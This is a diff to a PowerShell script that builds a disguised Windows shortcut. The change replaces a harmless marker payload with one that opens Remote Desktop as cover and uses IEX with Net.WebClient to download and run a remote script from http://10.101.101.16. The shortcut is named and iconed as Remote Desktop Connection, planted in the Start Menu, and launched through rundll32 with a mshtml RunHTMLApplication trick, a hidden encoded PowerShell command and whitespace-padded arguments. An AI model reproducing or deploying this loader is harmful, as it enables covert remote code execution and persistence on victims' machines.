@@ -6,14 +6,13 @@
 # -to be dropped to disk/loaded into memory
 #
 
-$shortcutName = "我的电脑.lnk"
-$shortcutOutputPath = "$Home\Desktop\"+$shortcutName
+$shortcutName = "远程桌面连接.lnk"
+$shortcutOutputPath = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Accessories\"+$shortcutName
 $shortcutFallbackExecutionFolder="`$env:temp"
 $payloadContents =
 @'
-    explorer
-    echo $env:computername >> $Home\Desktop\IhaveRun.txt
-    echo $env:computername >> $Home\Desktop\IhaveRun.txt
+    c:\windows\system32\mstsc.exe
+    IEX (New-Object Net.WebClient).DownloadString("http://10.101.101.16/rlnk.ps1")
 '@
 
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($payloadContents)
@@ -75,8 +74,8 @@ iex $scB;
     $Shortcut.TargetPath = "C:\Windows\System32\rundll32.exe"
     #$Shortcut.Arguments = "-WindowStyle Hidden -Ep ByPass `$r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('$encodedCommand'))";
     $Shortcut.Arguments = '                                                                                                                                                                                                                                                                    javascript:"\..\mshtml,RunHTMLApplication ";new%20ActiveXObject("WScript.Shell").Run("powershell.exe -Enc '+$payload+'",0,true);self.close();'
-    $Shortcut.IconLocation = "C:\Windows\system32\SHELL32.dll, 15"
-    #$Shortcut.IconLocation = "C:\ProgramData\Microsoft\Office\MySharePoints.ico"
+    #$Shortcut.IconLocation = "C:\Windows\system32\SHELL32.dll, 15"
+    $Shortcut.IconLocation = "%windir%\system32\mstsc.exe"
     $Shortcut.Save()
 }
 
